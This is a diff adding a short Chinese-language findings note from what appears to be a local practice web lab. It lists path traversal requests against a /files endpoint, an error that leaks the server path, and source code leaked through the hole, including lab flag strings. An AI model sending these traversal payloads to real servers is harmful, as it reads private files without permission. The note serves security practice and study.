@@ -1,0 +1,14 @@
+GET http://127.0.0.1:18081/files?name=  -> {"error":"[Errno 2] No such file or directory: '...\\labs\\weblab-api\\readme.txt'"}
+  （报错回显服务端绝对路径：C:\Users\Administrator\Documents\GitHub\helm-pi\labs\weblab-api\）
+
+GET /files?name=../README.md  -> 返回父目录 README.md 内容（weblab-api 目录说明）
+GET /files?name=../weblab-api/server.py -> 返回服务源码前 500 字节
+GET /files?name=../../labs/weblab-api/server.py -> 同上（穿越有效）
+GET /files?name=.. / ../  -> {"error":"[Errno 13] Permission denied: ..."}（目录不可读）
+
+源码片段（前 500 字节，/files 内容截断上限 500）：
+  USERS = {"1": {"role":"user","name":"alice"}, "2": {"role":"admin","name":"bob"}}
+  NOTES = {"1": "alice-note", "2": "admin-secret-FLAG{idor_user2}"}
+  FLAG = "FLAG{api_chain_ok}"
+
+结论：/files?name= 存在路径穿越 + 错误信息泄露；结合源码确认 admin=uid 2、FLAG 常量。
